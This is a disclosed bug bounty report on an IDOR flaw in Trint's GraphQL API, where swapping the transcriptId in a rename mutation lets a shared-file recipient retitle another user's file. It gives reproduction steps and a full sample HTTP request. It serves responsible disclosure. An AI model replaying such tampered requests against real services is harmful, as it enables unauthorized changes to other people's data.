# IDOR in changing shared file name

## Report Details
- **Report ID**: 547663
- **URL**: https://hackerone.com/reports/547663
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-04-24T13:41:15.169Z
- **Disclosed**: 2019-06-22T13:30:51.093Z

## Reporter
- **Username**: dhakal_ananda
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: trint

## Vulnerability Information
## Summary:
Hi Trind LTD,
I have found a IDOR vulnerability in https://app.trint.com . An user can change shared file names through this IDOR.

## Steps To Reproduce:

1. Create a file from account B
2. Capture the request of renaming the file as shown in **sample request**
3. Create a file [from account A] and share it with another user [account B] 
4. Change the **transcriptId** to shared file's transcriptid
5. Boom! The name of shared file is changed

***Sample Request:***
```
POST / HTTP/1.1
Host: graphql2.trint.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://app.trint.com/trints
content-type: application/json
Authorization: Bearer token..
X-Trint-Request-Id: 34ba5627-d874-4be1-8f9b-5b1415c2f0a5
X-Trint-Super-Properties: {"distinct_id":"5cc05c8f03c35799283fe3b7","$device_id":"16a4f88b2e22dc-07342bd7a0305c8-4c312c7c-144000-16a4f88b2e3be9","$initial_referrer":"$direct","$initial_referring_domain":"$direct","returningUser":true,"$user_id":"5cc05c8f03c35799283fe3b7"}
Origin: https://app.trint.com
Content-Length: 536
Connection: close

{"operationName":"updateTranscriptMeta","variables":{"userId":"5cc05c8f03c35799283fe3b7","transcriptId":"dM3YxaINQGyWceq5rUzVog","transcriptName":"W00"},"query":"mutation updateTranscriptMeta($userId: String!, $transcriptName: String!, $transcriptId: String!) {\n  updateTranscriptMeta(userId: $userId, transcriptMeta: {trintTitle: $transcriptName}, transcriptId: $transcriptId) {\n    ...RenameTrintFragment\n    __typename\n  }\n}\n\nfragment RenameTrintFragment on TrintMetadata {\n  _id\n  trintTitle\n  updated\n  __typename\n}\n"}
```

## Impact

Unauthorized users could change the file name. It is not allowed to rename the file for shared users but it is bypassed here through IDOR.

## Attachments
No attachments
